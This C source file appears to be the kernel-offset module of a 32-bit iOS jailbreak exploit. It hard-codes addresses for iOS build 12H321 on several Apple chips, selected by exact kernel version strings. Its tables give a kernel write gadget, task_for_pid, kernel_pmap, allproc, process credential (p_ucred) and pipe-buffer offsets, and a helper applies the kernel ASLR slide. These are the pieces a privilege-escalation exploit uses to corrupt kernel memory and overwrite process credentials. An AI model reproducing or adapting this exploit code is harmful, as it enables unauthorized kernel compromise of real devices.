#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/utsname.h>

#include <common.h>
#include <kslide.h>
#include <plog.h>
#include <offsets.h>

static addr_t vtab = 0;

addr_t* offsets = NULL;

static addr_t koffsets_S5L895xX_12H321[] =
{
    0x802DA865, // OSSerializer::serialize
    0x802DC985, // OSSymbol::getMetaClass
    0x8001E301, // calend_gettime
    0x800C75F5, // _bufattr_cpx
    0x803B2CDC, // clock_ops
    0x800B486C, // _copyin
    0x800C75F6, // BX LR
    0x800B45A8, // write_gadget: str r1, [r0, #0xc] , bx lr
    0x803F9258, // vm_kernel_addrperm
    0x803A811C, // kernel_pmap
    0x800A8758, // flush_dcache
    0x800B4600, // invalidate_tlb
    0x802C15C8, // task_for_pid
    0x18,       // pid_check_addr offset
    0x3e,       // posix_check_ret_addr offset
    0x222,      // mac_proc_check_ret_addr offset
    0x803FA970, // allproc
    0x8,        // proc_t::p_pid
    0x8c,       // proc_t::p_ucred
    0x8039dd08, // vtab
    0x44,       // IPC_PORT_IP_KOBJECT
    0x1f0,      // TASK_BSD_INFO
    0x90,       // p->p_fd
    0x0,        // FILEDESC_FD_OFILES
    0x8,        // FILEPROC_F_FGLOB
    0x28,       // FILEGLOB_FG_DATA
    0x10,       // KSTRUCT_OFFSET_PIPE_BUFFER
};
static addr_t koffsets_S5L894xX_12H321[] =
{
    0x802D5A1D, // OSSerializer::serialize
    0x802D7AFD, // OSSymbol::getMetaClass
    0x8001E0A1, // calend_gettime
    0x800C4719, // _bufattr_cpx
    0x803ADCDC, // clock_ops
    0x800B2744, // _copyin
    0x800C471A, // BX LR
    0x800B2488, // write_gadget: str r1, [r0, #0xc] , bx lr
    0x803F4128, // vm_kernel_addrperm
    0x803A311C, // kernel_pmap
    0x800A7D10, // flush_dcache
    0x800B24E0, // invalidate_tlb
    0x802BCDD0, // task_for_pid
    0x18,       // pid_check_addr offset
    0x3e,       // posix_check_ret_addr offset
    0x222,      // mac_proc_check_ret_addr offset
    0x803F5810, // allproc
    0x8,        // proc_t::p_pid
    0x8c,       // proc_t::p_ucred
    0x80398d08, // vtab
    0x44,       // IPC_PORT_IP_KOBJECT
    0x1f0,      // TASK_BSD_INFO
    0x90,       // p->p_fd
    0x0,        // FILEDESC_FD_OFILES
    0x8,        // FILEPROC_F_FGLOB
    0x28,       // FILEGLOB_FG_DATA
    0x10,       // KSTRUCT_OFFSET_PIPE_BUFFER
};

static bool offsets_initialize(void)
{
    static bool init = false;
    
    if(!init)
    {
        struct utsname u = {};
        uname(&u);
        
        LOG("kern.version: %s", u.version);
        
        if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:44 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8950X") == 0)
        {
            offsets = koffsets_S5L895xX_12H321;
            init = true;
        }
        
        if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:36 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8955X") == 0)
        {
            offsets = koffsets_S5L895xX_12H321;
            init = true;
        }
        
        if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:24 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8940X") == 0)
        {
            offsets = koffsets_S5L894xX_12H321;
            init = true;
        }
        
        if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:26:26 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8942X") == 0)
        {
            offsets = koffsets_S5L894xX_12H321;
            init = true;
        }
        
        if (strcmp(u.version, "Darwin Kernel Version 14.0.0: Wed Aug  5 19:24:41 PDT 2015; root:xnu-2784.40.6~18/RELEASE_ARM_S5L8945X") == 0)
        {
            offsets = koffsets_S5L894xX_12H321;
            init = true;
        }
    }
    
    return init;
}

addr_t koffset(enum koffsets offset)
{
    if (!offsets_initialize())
    {
        return 0;
    }
    
    if (offsets == NULL)
    {
        return 0;
    }
    
    return offsets[offset];
}


static addr_t reg_vtab(void)
{
    return koffset(off_reg_vtab);
}

addr_t off_vtab(void)
{
    if(vtab == 0)
    {
        vtab = reg_vtab();
        DEVLOG("got vtab (unslid): " ADDR, vtab);
        vtab += get_kernel_slide();
    }
    return vtab;
}


